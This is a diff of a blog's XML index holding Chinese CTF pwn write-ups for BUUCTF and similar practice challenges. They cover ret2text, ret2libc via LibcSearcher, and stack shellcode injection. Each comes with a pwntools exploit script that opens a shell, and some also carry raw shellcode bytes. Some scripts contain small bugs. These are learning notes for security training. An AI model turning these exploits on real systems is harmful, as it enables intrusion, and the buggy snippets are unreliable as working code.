+<p><img data-src="https://img-blog.csdnimg.cn/20200825172042284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center"></p>
+<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>分析  是相同的思想，这里不赘述了，大致流程就是</p>
+<ol>
+<li>利用一个程序已经执行过的函数去泄露它在程序中的地址，然后取末尾3个字节，去找到这个程序所使用的libc的版本</li>
+<li>用同一个程序里函数的地址-libc里的函数地址即可得到偏移量</li>
+<li>得到偏移量后就可以推算出程序中其他函数的地址，知道其他函数的地址之后就可以去执行system（’&#x2F;bin&#x2F;sh‘）</li>
+</ol>
+<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>写exp</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line"></span><br><span class="line">p=remote(&#x27;node4.buuoj.cn&#x27;,28342)</span><br><span class="line">elf=ELF(&#x27;./ciscn_2019_c_1&#x27;)</span><br><span class="line"></span><br><span class="line">main=0x400b28</span><br><span class="line">pop_rdi=0x400c83</span><br><span class="line">ret=0x4006b9</span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;choice!\n&#x27;,&#x27;1&#x27;)</span><br><span class="line">payload=&#x27;\0&#x27;+&#x27;a&#x27;*(0x50-1+8)</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(main)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;encrypted\n&#x27;,payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">puts_addr=u64(r.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&#x27;\0&#x27;))</span><br><span class="line">print hex(puts_addr)</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class="line">offset=puts_addr-libc.dump(&#x27;puts&#x27;)</span><br><span class="line">binsh=offset+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line">system=offset+libc.dump(&#x27;system&#x27;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;choice!\n&#x27;,&#x27;1&#x27;)</span><br><span class="line"></span><br><span class="line">payload=&#x27;\0&#x27;+&#x27;a&#x27;*(0x50-1+8)</span><br><span class="line">payload+=p64(ret)</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(binsh)</span><br><span class="line">payload+=p64(system)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;encrypted\n&#x27;,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><a href="https://github.com/lieanu/LibcSearcher">libcsearch</a>的github网址<br>安装</p>
+<blockquote>
+<p>git clone <a href="https://github.com/lieanu/LibcSearcher.git">https://github.com/lieanu/LibcSearcher.git</a><br>cd LibcSearcher<br>sudo python setup.py develop</p>
+</blockquote>
+<p>覆盖数据payload&#x3D;b’\0’+b’a’*(0x50-1+8)<br>\0是为了让加密函数的一个strlen函数停止（这个函数遇‘0’会停止），从而绕过加密，保证我们构造的rop不会被破坏，<br>buf的大小为0x50<br>-1是减去\0<br>+8是覆盖rbp</p>
+<p>这道题的接收非常讲究<br>泄露地址接收时先是两下recvline()，<br>原因</p>
+<blockquote>
+<p>recvline()一次接收到\n;<br>第一次recvline只能到Ciphertext；<br>第二次只能接收到0a<br>第三次的recvuntil才开始处理泄露的got地址。<br>先开一下context_log_lever&#x3D;’debug’，整体看一下， 再自己recvuntil看能接收到什么内容。</p>
+</blockquote>
+<p>然后再用recvuntil(‘\n’)[:-1].ljust(8,’\0’)来舍弃接收到的字符串最后的’\x0’并向左补齐</p>
+<p>还有<br>这一道题是64位的程序，这边涉及到64位程序和32位程序运行时的区别了<br>32位程序运行执行指令的时候直接去内存地址寻址执行<br>64位程序则是通过寄存器来传址，寄存器去内存寻址，找到地址返回给程序<br>因此要用寄存器存参<br>（为什么呢？？还是不理解啊）<br><img data-src="https://pic2.zhimg.com/80/v2-64d98b53873c335d7f889b202b92fb9d_1440w.webp"></p>
+<p>注意栈对齐<br><img data-src="https://pic1.zhimg.com/80/v2-5fb909989f2a46201c004e96d46f6890_1440w.webp"><br>虽然我不懂为什么要……</p>
+<p>还有<br>最后为什么还要再输一个0呢？</p>
+<p><img data-src="https://pic2.zhimg.com/80/v2-ffa2e57740c5b5b7047a9a03f3183039_1440w.webp"></p>
+<p>搞不懂了    <strong>求助</strong></p>
+<p>其实做这题主要还是模仿大佬们写的exp，好多细节都不清楚，但是感觉做了那么久又不能扔在那边等完全懂了再写题解    <del>感觉好浪费</del><br>还得再研究啊 </p>
+<p>参考资料：<br>  <a href="http://t.csdn.cn/m6si5">[BUUCTF]PWN6——ciscn_2019_c_1</a></p>
+]]></content>
+      <categories>
+        <category>wp</category>
+      </categories>
+      <tags>
+        <tag>ctf BUUCTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>week6-T1</title>
+    <url>/posts/c63e16b3/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="Week-6-T1-bjdctf-2020-babystack"><a href="#Week-6-T1-bjdctf-2020-babystack" class="headerlink" title="Week 6 T1 bjdctf_2020_babystack"></a>Week 6 T1 bjdctf_2020_babystack</h2><blockquote>
+<p>2023-02-05WP<br>BUUCTF pwn 第十一题<br>考点：ret2text</p>
+</blockquote>
+<span id="more"></span>
+
+<p>省略第一步……只开了NX</p>
+<blockquote>
+<p>__isoc99_scanf(“%d”, &amp;nbytes)    让用户输入下次输入时接受的数据的长度</p>
+</blockquote>
+<blockquote>
+<p>read(0, &amp;buf, (unsigned int)nbytes)   用户可以控制长度，实现栈溢出</p>
+</blockquote>
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>打开IDA</p>
+<p><img data-src="https://img-blog.csdnimg.cn/20200802192521891.png"></p>
+<p>找到有&#x2F;bin&#x2F;sh<br>找到后门函数</p>
+<p><img data-src="https://img-blog.csdnimg.cn/20200802192937904.png"></p>
+<p>buf占用的空间为0x10</p>
+<p><img data-src="https://img-blog.csdnimg.cn/20200802192913332.png"></p>
+<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import * </span><br><span class="line"></span><br><span class="line">p = remote(&#x27;node4.buuoj.cn&#x27;,29891)</span><br><span class="line"></span><br><span class="line">backdoor_addr = 0x4006e6</span><br><span class="line"></span><br><span class="line">payload =b &#x27;a&#x27; * (0x10+8) + p64(backdoor_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(b&#x27;100&#x27;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>发现这样也不错，交给工具来找地址</p>
+<p><img data-src="https://img-blog.csdnimg.cn/4d3c024d108c4bbd85c7ef85fd505712.png"></p>
+<ul>
+<li>变量(unsigned int)nbytes用户可控，且是个无符号函数</li>
+<li><strong>可用-1进行绕过</strong>，这样用户可输入的数据长度就十分巨大了</li>
+<li>接着调用backdoor()即可getshell</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#start</span><br><span class="line"># r = process(&quot;../buu/bjdctf_2020_babystack&quot;)</span><br><span class="line">r = remote(&quot;node4.buuoj.cn&quot;,29891)</span><br><span class="line">elf = ELF(&quot;../buu/bjdctf_2020_babystack&quot;)</span><br><span class="line"></span><br><span class="line">#params</span><br><span class="line">backdoor_addr = elf.symbols[&#x27;backdoor&#x27;]</span><br><span class="line"></span><br><span class="line">#attack</span><br><span class="line">r.recvuntil(b&quot;your name:&quot;)</span><br><span class="line">r.sendline(&quot;-1&quot;)</span><br><span class="line">r.recvuntil(b&quot;name?&quot;)</span><br><span class="line">payload = b&#x27;M&#x27; * (0x10 + 8) + p64(backdoor_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>wp</category>
+      </categories>
+      <tags>
+        <tag>ctf BUUCTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>关于分配动态内存编译器警告C6001和C6011</title>
     <url>/posts/0/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="关于分配动态内存编译器警告C6001和C6011"><a href="#关于分配动态内存编译器警告C6001和C6011" class="headerlink" title="关于分配动态内存编译器警告C6001和C6011"></a>关于分配动态内存编译器警告C6001和C6011</h1><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>在做数据结构与算法的二叉树实验时，要在非递归计算度为1的节点的函数里用到一个结构体。</p>
@@ -294,417 +705,6 @@
       </categories>
       <tags>
         <tag>算法</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>week4 T1</title>
-    <url>/posts/64ef4d6b/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="Week4-amp-amp-Week5-T1-jarvisoj-level0"><a href="#Week4-amp-amp-Week5-T1-jarvisoj-level0" class="headerlink" title="Week4&amp;&amp;Week5 T1  jarvisoj_level0"></a>Week4&amp;&amp;Week5 T1  jarvisoj_level0</h2><p>2023-01-20WP<br>BUUCTF pwn 第六题<br>考点： 简单栈溢出&#x2F;基本rop ret2text</p>
-<span id="more"></span>
-
-<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file checksec —— 64-bit，开NX</p>
-<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA查看发现main函数里的vulnerable_function()函数里的read函数读取0x200ull，而buf空间只有0x80<br>又找到有system(“&#x2F;bin&#x2F;sh”)<br>返回其地址</p>
-<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p><strong>exp</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&quot;node4.buuoj.cn&quot;,29175)</span><br><span class="line">ret_arr = 0X40059A</span><br><span class="line">payload = b&#x27;a&#x27;*(0x80 + 0x8) + p64(ret_arr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>wp</category>
-      </categories>
-      <tags>
-        <tag>ctf BUUCTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>week3 T5</title>
-    <url>/posts/fe55b1cb/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T5-level2"><a href="#T5-level2" class="headerlink" title="T5 level2"></a>T5 level2</h2><blockquote>
-<p>2023-01-15WP<br>攻防世界pwn题<br>考点：ret2libc1<br>（不是我不想往下做，而是往下做的话真的是要补太多知识了，新的知识还没学会，只好找一题来划一下水了……）</p>
-</blockquote>
-<span id="more"></span>
-
-<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file，checksec —— 32-bit，开启NX</p>
-<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA一看没啥，点进vuln函数找到一个read函数<br><img data-src="https://pic1.zhimg.com/80/v2-3f3caf9f6fe1b9fe6e5088a2e1619e2c_1440w.webp"><br><img data-src="https://pic2.zhimg.com/80/v2-3a54c2fc46d20dc1f7a6493a4fd40ba9_1440w.webp"><br>由图中我们可以看到，buf分配的空间为0x88,而read函数读取0x100，显然存在溢出<br>shift+f12找到有字符串&#x2F;bin&#x2F;sh，并且在vuln函数里有system函数，只不过参数是”ehco Input：”罢了<br>记下system函数的plt表地址0x08048320<br><img data-src="https://pic1.zhimg.com/80/v2-f2adaa287713c287b7d0b7070f687524_1440w.webp"></p>
-<p>这样就只需要我们覆盖buf，将system函数地址写为返回地址，并将&#x2F;bin&#x2F;sh作为参数传递其地址即可</p>
-<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>exp</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27; 61.147.171.105 &#x27;</span>, <span class="number">60218</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(<span class="number">0x08048320</span>)+<span class="string">b&#x27;bbbb&#x27;</span> + p32(<span class="number">0x0804A024</span>)</span><br><span class="line"><span class="comment">#0x88为buf大小，+4是ebp大小，p32(0x08048320)是打包system地址，b&#x27;bbbb&#x27;是填充无效system返回地址， </span></span><br><span class="line"><span class="comment">#p32(0x0804A024)是/bin/sh地址</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>wp</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>攻防世界</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>week3 T4</title>
-    <url>/posts/8952815d/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T4-ret2shellcode-2-栈写入"><a href="#T4-ret2shellcode-2-栈写入" class="headerlink" title="T4 ret2shellcode 2 (栈写入)"></a>T4 ret2shellcode 2 (栈写入)</h2><blockquote>
-<p>2023-01-15WP<br>sniperoj-pwn100-shellcode<br>考点：栈溢出 shellcode</p>
-</blockquote>
-<span id="more"></span>
-
-<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file ,checksec检查保护机制<br><img data-src="https://pic2.zhimg.com/80/v2-93af3c284b45a8b1bc9b8d234218d6b9_1440w.webp"><br>开启了PIE  地址变换</p>
-<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA中看看源码<br><img data-src="https://pic1.zhimg.com/80/v2-1dda406b44f40e076971774458e5d654_1440w.webp"><br>发现已经有输出了buf的地址，因此随机化地址便可以进行绕过<br>继续分析发现read函数读入0x40字节，而buf分配的空间才0x10字节，存在栈溢出<br>打开string window，没有system和&#x2F;bin&#x2F;sh，应该是要写入shellcode了</p>
-<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>先看看我们的空间能不能写下shellcode这里main函数里声明的buf只有0x10即16字节，属于局部变量，空间分配在栈上<br>gdb动态调试，（其实IDA能看出来，就是不确定对不对就是了）<br><img data-src="https://img-blog.csdnimg.cn/img_convert/3bcd85545cf60cac9b4aefb0eee24d1b.png"><br>我们计算buf的偏移量为rbp - rsp  &#x3D; 0x7fffde3d2820 - 0x7fffde3d2810 &#x3D; 10，再加上rbp 8字节为0x18即24字节</p>
-<p>而我们用shellcraft生成的shellcode时44字节的，显然已经超过了<br>于是我们想找一个长度较小的shellcode来写入，但是由于某些我还没搞很懂的原因，我们必须要将把shellcode放在返回<br>地址的后面<br>那放在后面的话是不是44字节的shellcode就可以使用了呢？其实也不行，要注意到read函数是读取0x40字节的，这就使得读取的字符串长度有一定的限制。这0x40字节的数据，既要包括填充的垃圾数据，也要包括shellcode的返回地址和shellcode的内容，我们还得计算一下允许的shellcode的长度<br>0x40 - ( 0x10 + 8 ) - 8 &#x3D; 32<br>（0x10+8）为造成溢出填充的垃圾数据，后面8为是shellcode地址的长度，所以构建的shllcode必须在32以内<br>之前使用的shellcraft.sh()生成的shellcode有44字节，在这里只有32字节，因此并不适用</p>
-<blockquote>
-<p>shellcode&#x3D;”\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05”</p>
-</blockquote>
-<p>一个找shellcode的网站</p>
-<blockquote>
-<p><a href="https://www.exploit-db.com/shellcodes">https://www.exploit-db.com/shellcodes</a><br><a href="http://shell-storm.org/shellcode/">http://shell-storm.org/shellcode/</a> </p>
-</blockquote>
-<p>这个shellcode只有23个字节，短小精悍，适合放在栈中去执行</p>
-<p>写exp (发现一个地方：就是正常python代码不能在开头留空格)</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">addr = p.recvuntil(<span class="string">&#x27;]&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Now give me your answer&#x27;</span>)</span><br><span class="line">shellcode=<span class="string">&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span> + p64(<span class="built_in">int</span>(addr,<span class="number">16</span>)+<span class="number">32</span>) + shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p>这里我们只知道一个确定的buf的addr，shellcode的地址要从buf的地址推出来，也就是int(addr,16)+32</p>
-<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>为什么不可以找一个长度小于24的shellcode直接写入buf中呢？而非要先填充buf再返回至写shellcode的地方呢？<br>在网上找到一个解释不知道对不对</p>
-<blockquote>
-<p>因为其本身是有push指令的，如果我们把shellcode放在返回地址的前面，在程序leave的时候会破坏shellcode，所以我们将其放在后面</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>wp</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>ctf-wiki</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>week3 T3</title>
-    <url>/posts/173614fe/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T3-ret2shellcode-1-bss段写入"><a href="#T3-ret2shellcode-1-bss段写入" class="headerlink" title="T3 ret2shellcode 1  (bss段写入)"></a>T3 ret2shellcode 1  (bss段写入)</h2><blockquote>
-<p>2023-01-15WP<br>ctf-wiki pwn<br>考点：栈溢出 shellcode</p>
-</blockquote>
-<span id="more"></span>
-
-<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file，checksec —— 32bit，啥保护都没开<br><img data-src="https://pic1.zhimg.com/80/v2-c30ffe5ee07a9e5b5d0f124f011cc634_1440w.webp"></p>
-<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA查看源码，没有system函数和&#x2F;bin&#x2F;sh字符串<br>并且可以看到，main函数中，gets函数读取用户输入到变量s，strcnp将s中的字符串复制到buf2处<br><img data-src="https://pic3.zhimg.com/80/v2-da432353b394322fd2a9113c6042b0c6_1440w.webp"><br>buf2并没有在main函数中看到定义，应该是全局变量，进一步查看buf2在bss段中<br><img data-src="https://pic1.zhimg.com/80/v2-96ffdd44e368d33ff3f3def08797ce38_1440w.webp"></p>
-<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>通过vmmap我们可以查看bss段是否具有可执行权限<br><img data-src="https://pic1.zhimg.com/80/v2-3cac07ac2fda33db599f641decbd4a20_1440w.webp"><br>rw-p，可读可写<br>（这里操作上要注意一下，vmmap的命令要在程序运行时使用，可以给程序下断点或者ctrl+C停住程序再输命令）</p>
-<p><a href="https://ch4r1l3.github.io/2018/06/22/pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E7%AC%AC%E4%B8%89%E7%AB%A0%E2%80%94%E2%80%94gdb%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/">参考资料</a></p>
-<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>有执行权限的话就可以向bss段写入shellcode了，之后控制程序返回执行shellcode<br>在写exp之前还要先计算偏移量，方法和ret2text类似，与之前的偏移量都是一样的<br>用gdb调试或者爆破求出偏移量为112<br>使用shellcraft.sh()生成shellcode，并且用shellcode.ljust()方法向左对齐补齐字符串，溢出填充返回地址<br>exp为</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line"></span><br><span class="line">p.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">&#x27;A&#x27;</span>) + p32(buf2_addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>好像shellcode写在栈或者bss段上都可以吧？</p>
-<p>网上看到一个解释说不能直接把shellcode写在栈上？不知道对不对：<br>绝大多数的操作系统都默认开启ASLR保护，这大大提高了攻击栈的难度。因此，栈应当是我们最后考虑的对象</p>
-]]></content>
-      <categories>
-        <category>wp</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>ctf-wiki</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>week3 T2</title>
-    <url>/posts/60312468/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T2-wustctf2020-closed"><a href="#T2-wustctf2020-closed" class="headerlink" title="T2 wustctf2020_closed"></a>T2 wustctf2020_closed</h2><blockquote>
-<p>2023-01-15WP<br>BUUCTF  pwn<br>考点：close函数</p>
-</blockquote>
-<span id="more"></span>
-
-<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>做了hgame的第二题后，去补充了一下关于close函数的知识，再从BUUCTF中找了一题练了练<br>先file知道时64-bit</p>
-<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>这一题结构很简单，再IDA中直接能找到在main函数中的vulnerable函数中return shell函数中有system函数<br>直接给好了<br><img data-src="https://pic2.zhimg.com/80/v2-bd22be15351c97aebae2de7f1bd0f4bd_1440w.webp"><br><img data-src="https://pic3.zhimg.com/80/v2-640c1ebbaa31c9a5013bd8feafceaee6_1440w.webp"><br><img data-src="https://pic4.zhimg.com/80/v2-2c7eb0afee1a164507dd332cf37e7813_1440w.webp"></p>
-<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>但是因为</p>
-<blockquote>
-<p>close(1)<br>  close(2)</p>
-</blockquote>
-<p>将标准输出和标准错误输出关闭了，这样在窗口上看不到输出<br>这时候就需要我们重新定位标准输出</p>
-<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p><strong>补充一些知识</strong></p>
-<ul>
-<li><p>在Linux中的文件，文件描述符（file descriptor）是内核为了高效管理已被打开的文件所创建的索引，是一个非负整数（通常是小整数），用于指代被打开的文件，所有执行I&#x2F;O操作的系统调用都通过文件描述符。程序刚刚启动的时候，0是标准输入，1是标准输出，2是标准错误。如果此时去打开一个新的文件，它的文件描述符会是3。</p>
-</li>
-<li><p>标准输入输出的指向是默认的，也就是默认打开一个终端后，0，1，2都指向同一个位置也就是当前终端，我们可以修改它们的指向，也即重定位</p>
-</li>
-<li><p>我们可以将标准输出进行重定向</p>
-</li>
-<li><p>&amp;+文件描述符, 可以指代该文件(进程)</p>
-</li>
-</ul>
-<p>现在可以解决close函数的问题了<br>在同一个进程里面, 标准输出和标准输入的指向都是相同的终端. 由于标准输入没有被禁用，所以我们可以使用命令</p>
-<blockquote>
-<p>exec 1&gt;&amp;0</p>
-</blockquote>
-<p>让标准输出定位到标准输入的文件，也就相当于重启了标准输出<br>本质上即exec+重定向命令，只不过操作的是文件描述符<br>现在cat到的flag就能够输出了<br><img data-src="https://pic3.zhimg.com/80/v2-49e09c530cab090cb5dedbddbd1a8812_1440w.webp"><br><del>出题人很有意思，连接上环境第一件事是嘲讽一下你</del></p>
-<p><a href="https://blog.csdn.net/Y_peak/article/details/115406518">参考</a>    <a href="https://blog.csdn.net/Y_peak/article/details/115406518">文章</a></p>
-]]></content>
-      <categories>
-        <category>wp</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>BUUCTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>week3 T1</title>
-    <url>/posts/f93875d2/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T1-easy-overflow"><a href="#T1-easy-overflow" class="headerlink" title="T1 easy_overflow"></a>T1 easy_overflow</h2><blockquote>
-<p>2023-01-14WP<br>Hgame week1 pwn 第二题<br>考点：简单栈溢出</p>
-</blockquote>
-<span id="more"></span>
-
-<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p><strong>file</strong>——64-bit,<br><strong>checksec</strong> 开启NX<br><img data-src="https://picx.zhimg.com/80/v2-b02ac7a02df1467f41fa6b8ed8ecf147_1440w.png?source=d16d100b"></p>
-<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p><strong>IDA</strong>看源码，先找&#x2F;bin&#x2F;sh，一路索引过去发现在一个后门函数中</p>
-<p><img data-src="https://picx.zhimg.com/80/v2-9e559b87dc3591a21383567579e57aec_1440w.png?source=d16d100b"></p>
-<p><img data-src="https://pic1.zhimg.com/80/v2-6c43653aae10a9334f6d4a773827dcae_1440w.png?source=d16d100b"></p>
-<p>然后我的第一反应是先记下call system的地址，结果一看，没找到？取而代之的是call    sub_401060<br>于是我卡了一下，可能是第一次碰到这样的题的缘故，我没有意识到函数名称可以是不一样的<br>打开main函数伪代码也是这样……<br><img data-src="https://pic1.zhimg.com/80/v2-d944638581f5f4e8ed3bb1f91435d464_1440w.webp"><br>越看越不对劲，搜索资料才发现这种题的风格就是去符号使原函数名字无法显示<br>这么说IDA无法解决了</p>
-<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>我们转而动态调试试一下<br>我们假设文件带有system函数，又据题意应该是有gets或者read之类的函数的<br>运行文件测试一下确实如此<br><img data-src="https://pic1.zhimg.com/80/v2-c0c3d1d2b64d886ff2b0c795be14315c_1440w.webp"><br>那么我们在这几个函数处试着打断点<br><img data-src="https://pic3.zhimg.com/80/v2-ff2f8659b478bef6651b656f3a5ee762_1440w.webp"><br>我们可以看到，其中system的地址和后面函数中的call    sub_401060的plt处地址对上了<br>read函数的地址和main函数中的 call    sub_401080的plt处地址对上了<br>同时呢，gdb运行文件的时候还发现main函数中还有一个close函数，浏览一下main函数源码只有sub_401070了<br><img data-src="https://pic2.zhimg.com/80/v2-4d7a5a5c48c6c578df4ef9f351eac149_1440w.webp"><br><img data-src="https://pic2.zhimg.com/80/v2-8553dc620b792d521995f7e5718e1629_1440w.webp"><br>查阅了一些资料得知，close(1)关闭了标准输出，详细见这篇<a href="https://blog.csdn.net/xirenwang/article/details/104139866">文章</a><br>也就是有下面我们得到shell后无法在屏幕上看到flag的情况<br>这时候就要输入exec 1&gt;&amp;0重启标准输出<br>那么现在呢我们已经把文件里的几个主要函数分析好了，接下来就要找偏移量了</p>
